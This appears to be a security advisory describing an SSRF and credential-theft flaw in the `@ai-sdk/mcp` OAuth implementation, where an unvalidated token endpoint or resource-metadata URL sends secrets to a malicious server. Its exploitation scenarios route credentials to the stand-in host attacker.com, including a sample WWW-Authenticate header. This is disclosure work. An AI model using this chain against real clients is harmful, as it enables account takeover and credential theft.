# SSRF / Credential Theft via Unvalidated OAuth Discovery

## Vulnerability Summary

The `@ai-sdk/mcp` package's OAuth implementation does **not validate** that the `token_endpoint` URL from OAuth discovery metadata belongs to the same origin as the authorization server. A malicious discovery server can return a `token_endpoint` pointing to an attacker-controlled URL, causing the SDK to send OAuth credentials (authorization code, client secret, PKCE code verifier) directly to the attacker.

Additionally, the `resource_metadata` URL extracted from `WWW-Authenticate` headers (on 401 responses) is trusted without validation—a malicious MCP server can redirect the client to fetch discovery from attacker-controlled URLs.

**Severity**: High / Critical  
**CVSS**: Account takeover, credential exfiltration

## Affected Files

- `packages/mcp/src/tool/oauth.ts`
  - `exchangeAuthorization()` lines 638-640: uses `metadata.token_endpoint` without origin validation
  - `refreshAuthorization()` lines 779-781: same issue for refresh flow
  - `extractResourceMetadataUrl()` lines 103-131: URL from 401 header used as-is
  - `discoverOAuthProtectedResourceMetadata()`: fetches `resourceMetadataUrl` without validation

## Root Cause

1. **Token endpoint**: When `metadata.token_endpoint` is present, it is used directly:
   ```typescript
   const tokenUrl = metadata?.token_endpoint
     ? new URL(metadata.token_endpoint)   // ← No validation against issuer
     : new URL('/token', authorizationServerUrl);
   ```
   The OAuth 2.0 security best practice is to validate that `token_endpoint` shares the same origin as the authorization server (`issuer`).

2. **Resource metadata URL**: When MCP server returns 401 with `WWW-Authenticate: Bearer resource_metadata="<URL>"`, that URL is fetched for discovery. A malicious MCP server can point to an attacker's discovery server.

## Exploitation Scenario

### Vector 1: Explicit Discovery URL

Attacker runs a malicious discovery server (e.g., `http://attacker.com`). Victim or vulnerable app configures MCP with `serverUrl: 'http://attacker.com'` (phishing, misconfiguration, or malicious package).

1. SDK fetches `http://attacker.com/.well-known/oauth-protected-resource`
2. Attacker returns metadata with `authorization_servers: ['http://attacker.com']`
3. SDK fetches auth server metadata; attacker returns `token_endpoint: 'http://attacker.com/token'` (or a different attacker host)
4. User completes auth flow; SDK exchanges code at attacker's token endpoint
5. **Attacker receives**: authorization_code, client_secret (Basic auth), code_verifier

### Vector 2: 401 WWW-Authenticate (MCP Server Controlled)

User connects to attacker-run MCP server. Server returns 401 with:
```
WWW-Authenticate: Bearer resource_metadata="http://attacker.com/.well-known/oauth-protected-resource"
```
SDK fetches attacker URL for discovery → same credential theft chain.

## References

- RFC 8414 (OAuth 2.0 Authorization Server Metadata): token_endpoint must be validated
- OAuth 2.0 Security BCP: validate redirect/token URLs against issuer
